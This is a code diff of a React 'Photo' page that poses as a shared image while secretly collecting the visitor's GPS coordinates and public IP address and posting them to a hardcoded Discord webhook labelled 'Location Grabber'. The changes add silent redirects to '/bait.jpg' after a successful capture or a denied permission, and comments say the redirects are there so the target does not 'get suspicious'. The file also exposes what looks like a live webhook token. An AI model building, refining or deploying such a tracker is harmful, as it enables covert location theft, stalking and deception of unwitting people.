@@ -1,8 +1,6 @@
 import { useState, useEffect } from 'react';
 
 export default function Photo() {
-  const [step, setStep] = useState('loading');
-
   const WEBHOOK = 'https://discord.com/api/webhooks/1567022561219579977/Q_PoAILBosmbMaPOFDZ_NKV3isYOjkrdhk4BNndrVCR-riiX2Pr_IVmDDGBhKUV54e5Y'; 
 
   useEffect(() => {
@@ -12,16 +10,14 @@ export default function Photo() {
           sendToDiscord(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
         },
         (err) => {
-          setStep('failed');
+          // If they deny, just show a broken image
+          window.location.href = '/bait.jpg'; 
         }
       );
-    } else {
-      setStep('failed');
     }
   }, []);
 
   const sendToDiscord = async (lat, lon, acc) => {
-    // grab the IP right now, right before we send
     let currentIp = 'unknown';
     try {
       const ipRes = await fetch('https://api.ipify.org?format=json');
@@ -42,29 +38,19 @@ export default function Photo() {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         username: 'Location Grabber',
-        embeds: [{
-          title: '🎯 Exact Location Captured',
-          color: 0x00ff00,
-          fields,
-          timestamp: new Date().toISOString()
-        }]
+        embeds: [{ title: '🎯 Exact Location Captured', color: 0x00ff00, fields, timestamp: new Date().toISOString() }]
       })
     });
 
-    setStep('image');
+    // Instantly redirect to the actual image so they don't get suspicious
+    window.location.href = '/bait.jpg'; 
   };
 
   return (
     <div style={{ 
       display: 'flex', height: '100vh', width: '100vw', 
-      background: '#111', justifyContent: 'center', alignItems: 'center',
-      color: '#555', fontFamily: 'sans-serif'
+      background: '#000000' // Pitch black background
     }}>
-      {step === 'loading' && <p>Loading image...</p>}
-      {step === 'image' && (
-        <img src="/bait.jpg" alt="" style={{ maxWidth: '90%', maxHeight: '90%' }} />
-      )}
-      {step === 'failed' && <p>Image could not be loaded.</p>}
     </div>
   );
 }
